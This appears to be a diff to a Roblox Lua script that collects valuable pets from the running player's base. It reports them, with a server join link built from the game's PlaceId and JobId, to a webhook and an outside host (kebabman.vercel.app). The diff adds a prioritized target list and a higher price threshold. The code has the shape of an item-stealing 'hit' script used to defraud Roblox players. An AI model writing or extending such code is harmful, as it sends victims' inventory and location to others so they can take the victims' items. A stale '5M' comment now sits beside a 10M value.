@@ -28,13 +28,43 @@ local function parsePrice(priceText)
     end
 end
 
-local PRICE_LIMIT = 5_000_000 -- 5M
-local targetNames = { "Kitsune", "Dragonfly", "Pipi Kiwi" }
-local function isTargetName(name)
-    for _, n in ipairs(targetNames) do
-        if n == name then return true end
+local PRICE_LIMIT = 10_000_000 -- 5M
+
+-- ====== Target Names có ưu tiên ======
+local targetNames = {
+    {name = "Strawberry Elephant", priority = 1},
+    {name = "Dragon Cannelloni", priority = 2},
+    {name = "Spaghetti Tualetti", priority = 3},
+    {name = "Garama and Madundung", priority = 4},
+    {name = "Los Hotspotsitos", priority = 5},
+    {name = "Los Bros", priority = 6},
+    {name = "Ketchuru and Musturu", priority = 7},
+    {name = "La Supreme Combinasion", priority = 8},
+    {name = "Ketupat Kepat", priority = 9},
+    {name = "Esok Sekolah", priority = 10},
+    {name = "Los Nooo My Hotspotsitos", priority = 11},
+    {name = "Nooo My Hotspot", priority = 12},
+    {name = "Nuclearo Dinossauro", priority = 13},
+    {name = "La Grande Combinasion", priority = 14},
+    {name = "Los Combinasionas", priority = 15},
+    {name = "Tacorita Bicicleta", priority = 16},
+    {name = "67", priority = 17},
+}
+
+local function getPriority(name)
+    for _, t in ipairs(targetNames) do
+        if name:find(t.name) then
+            return t.priority
+        end
     end
-    return false
+    return math.huge
+end
+
+local function shuffle(tbl)
+    for i = #tbl, 2, -1 do
+        local j = math.random(i)
+        tbl[i], tbl[j] = tbl[j], tbl[i]
+    end
 end
 
 -- ====== Hàm lọc Pet trong base của mình ======
@@ -56,7 +86,7 @@ local function collectValidPets()
                                 local nameText = displayName.Text
                                 local priceText = priceLabel.Text
                                 local priceNum = parsePrice(priceText)
-                                if priceNum >= PRICE_LIMIT or isTargetName(nameText) then
+                                if priceNum >= PRICE_LIMIT or getPriority(nameText) ~= math.huge then
                                     table.insert(pets, string.format("%s (%s)", nameText, priceText))
                                 end
                             end
@@ -103,7 +133,37 @@ local function sendWebhook(link)
         warn("Không có pet nào đạt điều kiện, không gửi webhook.")
         return
     end
-    local lootText = table.concat(pets, "\n")
+
+    -- Tách pets theo ưu tiên
+    local priorityPets, randomPets = {}, {}
+    for _, pet in ipairs(pets) do
+        local petName = pet:match("^(.-) %(") or pet
+        local prio = getPriority(petName)
+        if prio ~= math.huge then
+            table.insert(priorityPets, {pet = pet, priority = prio})
+        else
+            table.insert(randomPets, pet)
+        end
+    end
+
+    -- Sắp xếp theo priority
+    table.sort(priorityPets, function(a, b)
+        return a.priority < b.priority
+    end)
+
+    -- Random nhóm còn lại
+    shuffle(randomPets)
+
+    -- Ghép kết quả cuối
+    local orderedPets = {}
+    for _, p in ipairs(priorityPets) do
+        table.insert(orderedPets, p.pet)
+    end
+    for _, r in ipairs(randomPets) do
+        table.insert(orderedPets, r)
+    end
+
+    local lootText = table.concat(orderedPets, "\n")
     local placeId = tostring(game.PlaceId or "")
     local jobId = tostring(game.JobId or "")
     local serverLink = ("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s"):format(placeId, jobId)
